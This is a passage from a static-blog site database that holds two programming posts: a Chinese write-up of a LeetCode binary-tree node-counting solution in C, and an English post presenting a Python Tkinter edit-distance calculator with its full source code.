1。所以如果我们知道一个节点的标号，直接除以2就是父节点标号了。\n那么如果一个节点除以4呢？就是爷爷节点的标号了。除以$2^n$呢？就是第n代祖先的标号了啦。\n**左节点还是右节点**\n一个节点的标号如果是奇数，就是右孩子，偶数的话，就是左孩子=。=用简单的$x &１$就可以得到结果了\n##本题解法##\n首先我们统计一下有多少层，得到大致的数据范围嘞。\n然后二分这些范围，看看二分到这个点存不存在，存在的话就往右找，不存在的话就往左找。\n**ps:这里的二分有点诡异，写的时候需要注意一下。细心点就能过。**\n代码如下：\n```\nint power(int a,int n)//快速幂，后边用的不少，干脆自己写一个\n{\n    int res = 1;\n    while(n)\n    {\n        if(n & 1) res *= a;\n        a *= a;\n        n >>= 1;\n    }\n    return res;\n}\n\nbool exist(struct TreeNode *root, int level, int mid)//看看是不是存在某个标号的节点\n{\n    int now;\n    struct TreeNode *tnode = root;\n    while(level --)\n    {\n        if((mid / power(2,level)) & 1) tnode = tnode->right;\n        else tnode = tnode->left;\n    }\n    if(tnode == NULL) return 0;\n    return 1;\n}\n\nint countNodes(struct TreeNode* root)//就是统计节点的函数啦\n{\n    int level = 0;\n    struct TreeNode *tnode = root;\n    if(root == NULL) return 0;\n    for(level = 0;; ++ level)\n    {\n        tnode = tnode->left;\n        if(tnode == NULL) break;\n    }\n    int left = power(2,level);\n    int right = power(2,level + 1) - 1;\n    int mid;\n    while(left < right - 1)\n    {\n        mid = (left + right) >> 1;\n        if(exist(root,level,mid)) left = mid;\n        else right = mid - 1;\n    }\n    if(exist(root,level,right)) return right;\n    return left;\n}\n```","source":"_posts/CountCompleteTreeNodes.md","raw":"title: \"Count Complete Tree Nodes\"\ndate: 2015-06-07 15:39:28\ntags: leetcode\n---\nGiven a complete binary tree, count the number of nodes.\n<!--more-->\n水题嘛~给一颗完全二叉树（误？），让统计一下一共有多少节点。\n这个题目不知道暴力遍历会不会过。按照leetcode的尿性是没问题的吧~只不过要快点的话还是二分\n##二叉树的问题##\n总之一个满二叉树，总会有一些奇怪的性质。比方说下边这个图的标号：\n![完全二叉树](/image/20150607154352.png)\n这个图就是个完全二叉树，我们可以看到什么呢？\n**父子节点标号关系**\n首先来说，一个节点的标号的左右孩子节点的标号是多少呢？如果这个节点是x,左孩子就是x * 2,右孩子就是x * 2 + 1。所以如果我们知道一个节点的标号，直接除以2就是父节点标号了。\n那么如果一个节点除以4呢？就是爷爷节点的标号了。除以$2^n$呢？就是第n代祖先的标号了啦。\n**左节点还是右节点**\n一个节点的标号如果是奇数，就是右孩子，偶数的话，就是左孩子=。=用简单的$x &１$就可以得到结果了\n##本题解法##\n首先我们统计一下有多少层，得到大致的数据范围嘞。\n然后二分这些范围，看看二分到这个点存不存在，存在的话就往右找，不存在的话就往左找。\n**ps:这里的二分有点诡异，写的时候需要注意一下。细心点就能过。**\n代码如下：\n```\nint power(int a,int n)//快速幂，后边用的不少，干脆自己写一个\n{\n    int res = 1;\n    while(n)\n    {\n        if(n & 1) res *= a;\n        a *= a;\n        n >>= 1;\n    }\n    return res;\n}\n\nbool exist(struct TreeNode *root, int level, int mid)//看看是不是存在某个标号的节点\n{\n    int now;\n    struct TreeNode *tnode = root;\n    while(level --)\n    {\n        if((mid / power(2,level)) & 1) tnode = tnode->right;\n        else tnode = tnode->left;\n    }\n    if(tnode == NULL) return 0;\n    return 1;\n}\n\nint countNodes(struct TreeNode* root)//就是统计节点的函数啦\n{\n    int level = 0;\n    struct TreeNode *tnode = root;\n    if(root == NULL) return 0;\n    for(level = 0;; ++ level)\n    {\n        tnode = tnode->left;\n        if(tnode == NULL) break;\n    }\n    int left = power(2,level);\n    int right = power(2,level + 1) - 1;\n    int mid;\n    while(left < right - 1)\n    {\n        mid = (left + right) >> 1;\n        if(exist(root,level,mid)) left = mid;\n        else right = mid - 1;\n    }\n    if(exist(root,level,right)) return right;\n    return left;\n}\n```","slug":"CountCompleteTreeNodes","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681u90008wypdpnygkhli","content":"<p>Given a complete binary tree, count the number of nodes.<br><a id=\"more\"></a><br>水题嘛~给一颗完全二叉树（误？），让统计一下一共有多少节点。<br>这个题目不知道暴力遍历会不会过。按照leetcode的尿性是没问题的吧~只不过要快点的话还是二分</p>\n<p>##二叉树的问题##<br>总之一个满二叉树，总会有一些奇怪的性质。比方说下边这个图的标号：<br><img src=\"/image/20150607154352.png\" alt=\"完全二叉树\"><br>这个图就是个完全二叉树，我们可以看到什么呢？<br><strong>父子节点标号关系</strong><br>首先来说，一个节点的标号的左右孩子节点的标号是多少呢？如果这个节点是x,左孩子就是x <em> 2,右孩子就是x </em> 2 + 1。所以如果我们知道一个节点的标号，直接除以2就是父节点标号了。<br>那么如果一个节点除以4呢？就是爷爷节点的标号了。除以$2^n$呢？就是第n代祖先的标号了啦。<br><strong>左节点还是右节点</strong><br>一个节点的标号如果是奇数，就是右孩子，偶数的话，就是左孩子=。=用简单的$x &amp;１$就可以得到结果了</p>\n<p>##本题解法##<br>首先我们统计一下有多少层，得到大致的数据范围嘞。<br>然后二分这些范围，看看二分到这个点存不存在，存在的话就往右找，不存在的话就往左找。<br><strong>ps:这里的二分有点诡异，写的时候需要注意一下。细心点就能过。</strong><br>代码如下：<br><figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> power(<span class=\"keyword\">int</span> a,<span class=\"keyword\">int</span> n)<span class=\"comment\">//快速幂，后边用的不少，干脆自己写一个</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> res = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(n)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(n &amp; <span class=\"number\">1</span>) res *= a;</span><br><span class=\"line\">        a *= a;</span><br><span class=\"line\">        n &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> exist(<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">TreeNode</span></span> *root, <span class=\"keyword\">int</span> level, <span class=\"keyword\">int</span> mid)<span class=\"comment\">//看看是不是存在某个标号的节点</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> now;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">TreeNode</span></span> *tnode = root;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(level --)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>((mid / power(<span class=\"number\">2</span>,level)) &amp; <span class=\"number\">1</span>) tnode = tnode-&gt;right;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> tnode = tnode-&gt;left;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(tnode == NULL) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> countNodes(<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">TreeNode</span></span>* root)<span class=\"comment\">//就是统计节点的函数啦</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> level = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">TreeNode</span></span> *tnode = root;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(root == NULL) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(level = <span class=\"number\">0</span>;; ++ level)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tnode = tnode-&gt;left;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(tnode == NULL) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> left = power(<span class=\"number\">2</span>,level);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> right = power(<span class=\"number\">2</span>,level + <span class=\"number\">1</span>) - <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> mid;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(left &lt; right - <span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        mid = (left + right) &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(exist(root,level,mid)) left = mid;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> right = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(exist(root,level,right)) <span class=\"keyword\">return</span> right;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> left;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>Given a complete binary tree, count the number of nodes.<br>","more":"<br>水题嘛~给一颗完全二叉树（误？），让统计一下一共有多少节点。<br>这个题目不知道暴力遍历会不会过。按照leetcode的尿性是没问题的吧~只不过要快点的话还是二分</p>\n<p>##二叉树的问题##<br>总之一个满二叉树，总会有一些奇怪的性质。比方说下边这个图的标号：<br><img src=\"/image/20150607154352.png\" alt=\"完全二叉树\"><br>这个图就是个完全二叉树，我们可以看到什么呢？<br><strong>父子节点标号关系</strong><br>首先来说，一个节点的标号的左右孩子节点的标号是多少呢？如果这个节点是x,左孩子就是x <em> 2,右孩子就是x </em> 2 + 1。所以如果我们知道一个节点的标号，直接除以2就是父节点标号了。<br>那么如果一个节点除以4呢？就是爷爷节点的标号了。除以$2^n$呢？就是第n代祖先的标号了啦。<br><strong>左节点还是右节点</strong><br>一个节点的标号如果是奇数，就是右孩子，偶数的话，就是左孩子=。=用简单的$x &amp;１$就可以得到结果了</p>\n<p>##本题解法##<br>首先我们统计一下有多少层，得到大致的数据范围嘞。<br>然后二分这些范围，看看二分到这个点存不存在，存在的话就往右找，不存在的话就往左找。<br><strong>ps:这里的二分有点诡异，写的时候需要注意一下。细心点就能过。</strong><br>代码如下：<br><figure class=\"highlight rust\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> power(<span class=\"keyword\">int</span> a,<span class=\"keyword\">int</span> n)<span class=\"comment\">//快速幂，后边用的不少，干脆自己写一个</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> res = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(n)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(n &amp; <span class=\"number\">1</span>) res *= a;</span><br><span class=\"line\">        a *= a;</span><br><span class=\"line\">        n &gt;&gt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> exist(<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">TreeNode</span></span> *root, <span class=\"keyword\">int</span> level, <span class=\"keyword\">int</span> mid)<span class=\"comment\">//看看是不是存在某个标号的节点</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> now;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">TreeNode</span></span> *tnode = root;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(level --)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>((mid / power(<span class=\"number\">2</span>,level)) &amp; <span class=\"number\">1</span>) tnode = tnode-&gt;right;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> tnode = tnode-&gt;left;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(tnode == NULL) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> countNodes(<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">TreeNode</span></span>* root)<span class=\"comment\">//就是统计节点的函数啦</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> level = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">TreeNode</span></span> *tnode = root;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(root == NULL) <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(level = <span class=\"number\">0</span>;; ++ level)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        tnode = tnode-&gt;left;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(tnode == NULL) <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> left = power(<span class=\"number\">2</span>,level);</span><br><span class=\"line\">    <span class=\"keyword\">int</span> right = power(<span class=\"number\">2</span>,level + <span class=\"number\">1</span>) - <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> mid;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(left &lt; right - <span class=\"number\">1</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        mid = (left + right) &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(exist(root,level,mid)) left = mid;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> right = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(exist(root,level,right)) <span class=\"keyword\">return</span> right;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> left;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"Distance Calculator GUI","date":"2015-10-17T11:38:54.000Z","_content":"Everyone want to calculate the distance between his Goddess and himself. This calculator can meet your need!\nThis is the first time that I use Python to generate a calculator.\n##AIM##\nThis program is used to get a GUI software for a edit distance calculator\n<!--more-->\n##USAGE##\n- **Use python to run**: Use *python distance.py* to run this program\n- **Input**: The input part is located at the top of this GUI. \n    - First is the input of S and T, which is the source string and the target string. The button behind the input box is used to choose a file to get the S and T. **Attention that only the FIRST LINE of the selected file will be read into the input box**\n    - Second is the input of step cost of insertion, deletion and substitution a letter. **The range of the input could be adjusted at the menu bar, under** *Option* \n    - The part after that is the check boxes of output. Users can choose to show the full edit matrix, backtrack matrix and the alignment. \n- **Output**: The output is located at the bottom of the GUI. It's the distance, full edit matrix, backtrack matrix and the alignment.\n##DESIGN##\nThe frame work of the design is shown below.\n![](/image/20151017design.jpg)\nThe blue boxes in Figure 1 is the frame I use. In order to align those boxes, I use many frames to get a better effect.\nFigure 2 is my initial design\n![](/image/20151017hand.jpg)\n##FEEDBACK##\n- **Yi Hu**: The GUI is neat and user-friendly. People without read me file can use it.\n- **XinYang Zhang**: This GUI looks compact and satisfies the requirements.\n- **Robert Brotzman - smith**: I think that is good. I would change the names of the strings to someting more meaningful as well as the operation names. Also maybe add names to the buttons to add files.\nFor Robert's suggestion, I changed my strings to \"deletion\", \"insertion\" and \"substitution\". Which is used in the homework assignment. For the \"add file\", I changed my \"...\" to \"open\". Thank him.\n##RUN CAPTURE##\nFigure 3-6 is the screenshot of this software.\n![Figure 3](/image/201510171.png)\n![Figure 4](/image/201510175.png)\n![Figure 5](/image/201510173.png)\n![Figure 6](/image/201510174.png)\n\n##CODE##\n```\nfrom Tkinter import *\nfrom tkFileDialog import *\nfrom tkSimpleDialog import *\nfrom array import *\n\n#this is the main class actually I only have ONE class\n\nclass application(Frame):\n\n    #this is the calculation part\n    def cal(self):\n        #get the value of S and T\n        S = self.textS.get(\"1.0\", END)\n        T = self.textT.get(\"1.0\", END)\n        lens = len(S)\n        lent = len(T)\n        if lens == 1 and lent == 1: \n            return \n        self.maxlen = 2\n        #init the dp and bk with 0 and -\n        #bk is the backtrack matrix\n        #dp is the full edit matrix\n        dp = [([0] * lent) for i in range(lens)]\n        bk = [(['-'] * lent) for i in range(lens)]\n\n        #init the first line and first colume\n        for i in range(1,lent):\n            dp[0][i] = dp[0][i - 1] + self.Sci.get()\n            bk[0][i] = '-'\n        for i in range(1,lens):\n            dp[i][0] = dp[i - 1][0] + self.Scd.get()\n            bk[i][0] = '|'\n\n        #use the DP formula to get the full edit matrix and backtrack matrix\n        for i in range(1,lens):\n            for j in range(1,lent):\n                if S[i - 1] == T[j - 1]:\n                    dp[i][j] = dp[i - 1][j - 1]\n                    bk[i][j] = '\\\\'\n                else: \n                    dp[i][j] = min(dp[i - 1][j] + self.Scd.get(), dp[i][j - 1] + self.Sci.get(), dp[i - 1][j - 1] + self.Scs.get())\n                    if dp[i][j] == dp[i - 1][j] + self.Scd.get():\n                        bk[i][j] = '|'\n                    if dp[i][j] == dp[i - 1][j - 1] + self.Scs.get():\n                        bk[i][j] = '\\\\'\n                #here I get the max lenth of all the numbers. To help align the output\n                self.maxlen = max(len(str(dp[i][j])),self.maxlen)\n        #here between every two numbers I got 2 spaces\n        self.maxlen += 2\n        #output the backtrack matrix\n        self.Dis.delete(first = 0, last = END)\n        self.Dis.insert(END, dp[lens - 1][lent - 1])\n        if self.backtrack.get() == TRUE:\n            self.BM.insert(END, '\\n--------------\\n')\n            self.BM.insert(END, '    ')\n            for i in range(0,lent - 1):\n                self.BM.insert(END, '  ' + T[i])\n            self.BM.insert(END, '\\n   0')\n            for i in range(0,lens):\n                if i != 0:\n                    self.BM.insert(END, S[i - 1])\n                for j in range(0,lent):\n                    if i == 0 and j == 0:\n                        continue\n                    if i == 0:\n                        self.BM.insert(END, '  -')\n                    if j == 0:\n                        self.BM.insert(END, '  |')\n                    if i != 0 and j != 0:\n                        self.BM.insert(END, '  ' + bk[i][j])\n                self.BM.insert(END, '\\n')\n\n        #if the full edit check button is selected, output the full edit matrix\n        if self.fulledit.get() == TRUE:\n            self.FD.insert(END, '\\n--------------\\n')\n            self.FD.insert(END, ' ' * self.maxlen * 2)\n            for i in range(0,lent - 1):\n                self.FD.insert(END, T[i].ljust(self.maxlen))\n            self.FD.insert(END, '\\n' + ' ' * self.maxlen)\n            for i in range(0,lens):\n                if i != 0:\n                    self.FD.insert(END, S[i - 1].ljust(self.maxlen))\n                for j in range(0,lent):\n                    self.FD.insert(END, str(dp[i][j]).ljust(self.maxlen))\n                self.FD.insert(END, '\\n')\n\n        #if hte alignment check box is selected, output the alignment\n        if self.align.get() == TRUE:\n            self.AL.insert(END, '\\n--------------\\n')\n            j = lent - 1\n            i = lens - 1\n            res = []\n            while TRUE:\n                #get the backtrack path\n                res.append(bk[i][j])\n                if bk[i][j] == '\\\\':\n                    i -= 1\n                    j -= 1\n                elif bk[i][j] == '|':\n                    i -= 1\n                elif bk[i][j] == '-':\n                    j -= 1\n                if i == 0 and j == 0:\n                    break\n            #reverse the backtrack path\n            res.reverse()\n\n            i = j = k = 0\n            #init the So, way and Ta list. which stores source, way, target information\n            So = ['a'] * len(res)\n            way = ['a'] * len(res)\n            Ta = ['a'] * len(res)\n            for p in range(len(res)):\n                if res[p] == '\\\\':\n                    So[k] = S[i]\n                    Ta[k] = T[j]\n                    if S[i] == T[j]:\n                        way[k] = '|'\n                    else:\n                        way[k] = ' '\n                    i += 1\n                    j += 1\n                if res[p] == '|':\n                    So[k] = S[i]\n                    Ta[k] = '-'\n                    way[k] = ' '\n                    i += 1\n                if res[p] == '-':\n                    So[k] = '-'\n                    Ta[k] = T[j]\n                    way[k] = ' '\n                    j += 1\n                k += 1\n            for i in range(len(res)):\n                self.AL.insert(END, ' ' + So[i])\n            self.AL.insert(END, '\\n')\n            for i in range(len(res)):\n                self.AL.insert(END, ' ' + way[i])\n            self.AL.insert(END, '\\n')\n            for i in range(len(res)):\n                self.AL.insert(END, ' ' + Ta[i])\n            self.AL.insert(END, '\\n')\n\n\n\n\n\n\n\n    #this function is used to init the class\n\n    def __init__(self, master):\n        Frame.__init__(self,master)\n        self.Sci = 1\n        self.Scd = 1\n        self.Scs = 1\n        self.maxlen = 2\n        self.pack()\n        self.create()\n\n    #this function is used to change the range of step cost\n    def changeRange(self):\n        while(TRUE):\n            Range = askinteger(\"Update the Range\",\"Please input the range\")\n            if Range > 0:\n                break\n            if Range == None:\n                break\n        self.Scd.config(to = Range)\n        self.Sci.config(to = Range)\n        self.Scs.config(to = Range)\n\n    #this function is used to show the menu bar\n    def menu(self):\n        menu = Menu()\n        self.master.config(menu = menu)\n        option = Menu(menu)\n        menu.add_cascade(label = \"Option\", menu = option)\n        option.add_command(label = \"Range of modify cost\", command = self.changeRange)\n\n\n    #this function is used to get the text boxes which appear at the bottom of the GUI\n    def getOut(self, name,father):\n        self.frm = LabelFrame(father, text = name, padx = 10, pady = 5)\n        lb = Text(self.frm, width = 30, wrap = NONE)\n        lb.config(font = (\"Courier\", 10))\n        sl = Scrollbar(self.frm)\n        sl.set(0.5,1)\n        sl.pack(side = RIGHT, fill = Y)\n        lb['yscrollcommand'] = sl.set\n        lb.pack(side = LEFT)\n        sl['command'] = lb.yview\n\n        sl = Scrollbar(self.frm, orient = HORIZONTAL)\n        sl.set(0.5,1)\n        sl.pack(fill = X)\n        lb['xscrollcommand'] = sl.set\n        lb.pack(side = TOP)\n        sl['command'] = lb.xview\n        self.frm.pack(side = LEFT)\n        return lb\n\n\n    #read S and T from files\n    def getFileS(self):\n        fd = askopenfilename()\n        if fd == \"\":\n            return \n        tmpfile = open(fd,\"r\")\n        self.textS.delete(\"1.0\", END)\n        self.textS.insert(\"1.0\", tmpfile.readline()[:-1])\n        tmpfile.close()\n\n    def getFileT(self):\n        fd = askopenfilename()\n        if fd == \"\":\n            return \n        tmpfile = open(fd,\"r\")\n        self.textT.delete(\"1.0\", END)\n        self.textT.insert(\"1.0\", tmpfile.readline()[:-1])\n        tmpfile.close()\n\n    #main function to show the GUI\n    def create(self):\n        self.menu()\n        Input = LabelFrame(self, text = \"Input\", padx = 10, pady = 5)\n\n        #input part\n        frm_L = LabelFrame(Input, text = \"Input S & T\", padx = 10, pady = 5)\n        \n        #the S and T input part\n        self.frm_LS = Frame(frm_L)\n        Label(self.frm_LS, text = \"S\", font = ('Arial', 12), padx = 10).pack(side = LEFT)\n        self.textS = Text(self.frm_LS,height = 3, width = 18, padx = 10)\n        self.textS.pack(side = LEFT)\n        Button(self.frm_LS, text = \"Open\", command = self.getFileS).pack(side = LEFT)\n        self.frm_LS.pack(side = TOP)\n\n        frm_LT = Frame(frm_L)\n        Label(frm_LT, text = \"T\", font = ('Arial', 12), padx = 10).pack(side = LEFT)\n        self.textT = Text(frm_LT,height = 3, width = 18, padx = 10)\n        self.textT.pack(side = LEFT)\n        Button(frm_LT, text = \"Open\", command = self.getFileT).pack(side = LEFT)\n        frm_LT.pack(side = TOP)\n\n        frm_L.pack(side = LEFT)\n\n        #the distance input part\n        frm_M = LabelFrame(Input, text = \"Cost of modify\", padx = 10, pady = 5)\n\n        frm_Mcd = Frame(frm_M)\n        Label(frm_Mcd, text = \"deletion\", font = ('Arial', 11), width = 10).pack(side = LEFT)\n        self.Scd = Scale(frm_Mcd, orient = HORIZONTAL, width = 10, from_ = 1, to = 5)\n        self.Scd.pack(side = LEFT)\n        frm_Mcd.pack(side = TOP)\n\n\n        frm_Mci = Frame(frm_M)\n        Label(frm_Mci, text = \"insertion\", font = ('Arial', 11), width = 10).pack(side = LEFT)\n        self.Sci = Scale(frm_Mci, orient = HORIZONTAL, width = 10, from_ = 1, to = 5)\n        self.Sci.pack(side = LEFT)\n        frm_Mci.pack(side = TOP)\n\n\n        frm_Mcs = Frame(frm_M)\n        Label(frm_Mcs, text = \"substitution\", font = ('Arial', 11), width = 10).pack(side = LEFT)\n        self.Scs = Scale(frm_Mcs, orient = HORIZONTAL, width = 10, from_ = 1, to = 5)\n        self.Scs.pack(side = LEFT)\n        frm_Mcs.pack(side = TOP)\n\n\n\n        #the check box input part\n        frm_R = LabelFrame(Input, text = \"Pick the output\", padx = 10, pady = 5)\n\n        self.fulledit = BooleanVar()\n        Checkbutton(frm_R, text = \"full edit\",height = 2, width = 18, anchor = W, variable = self.fulledit).pack(side = TOP, anchor = W)\n        self.backtrack = BooleanVar()\n        Checkbutton(frm_R, text = \"backtrack matrix\", height = 2, width = 18, anchor = W, variable = self.backtrack).pack(side = TOP, anchor = W)\n        self.align = BooleanVar()\n        Checkbutton(frm_R, text = \"alignment\", height = 2, width = 18, anchor = W, variable = self.align).pack(side = TOP, anchor = W)\n\n        convert = Frame(self)\n        Button(convert, text = \"Compare\", command = self.cal).pack()\n\n\n        #this is the output part\n        output = LabelFrame(self, text = \"Output\", padx = 10)\n        Disfrm = Frame(output, padx = 10, pady = 5)\n        Label(Disfrm, text = \"Distance\", padx = 10).pack(side = LEFT)\n        self.Dis = Entry(Disfrm, width = 10)\n        self.Dis.pack(side = LEFT)\n        Disfrm.pack(side = TOP)\n\n        #get three textboxes which is the full edit, backtrack matrix and alignment text boxes\n        self.FD = self.getOut(\"full edit\", output)\n        self.BM = self.getOut(\"backtrack matrix\", output)\n        self.AL = self.getOut(\"alignment\", output)\n\n        frm_L.pack(side = LEFT)\n        frm_M.pack(side = LEFT)\n        frm_R.pack(side = LEFT)\n\n        Input.pack()\n        convert.pack()\n        output.pack()\n\nif __name__ == \"__main__\":\n    root = Tk()\n    root.title(\"Distance Calculator\")\n    root.geometry(\"900x700\")\n    root.resizable(width = True, height = True)\n\n    app = application(root)\n    root.mainloop()\n```\n","source":"_posts/DistanceCalculatorGUI.md","raw":"title: \"Distance Calculator GUI\"\ndate: 2015-10-17 11:38:54\ntags: Python\n---\nEveryone want to calculate the distance between his Goddess and himself. This calculator can meet your need!\nThis is the first time that I use Python to generate a calculator.\n##AIM##\nThis program is used to get a GUI software for a edit distance calculator\n<!--more-->\n##USAGE##\n- **Use python to run**: Use *python distance.py* to run this program\n- **Input**: The input part is located at the top of this GUI. \n    - First is the input of S and T, which is the source string and the target string. The button behind the input box is used to choose a file to get the S and T. **Attention that only the FIRST LINE of the selected file will be read into the input box**\n    - Second is the input of step cost of insertion, deletion and substitution a letter. **The range of the input could be adjusted at the menu bar, under** *Option* \n    - The part after that is the check boxes of output. Users can choose to show the full edit matrix, backtrack matrix and the alignment. \n- **Output**: The output is located at the bottom of the GUI. It's the distance, full edit matrix, backtrack matrix and the 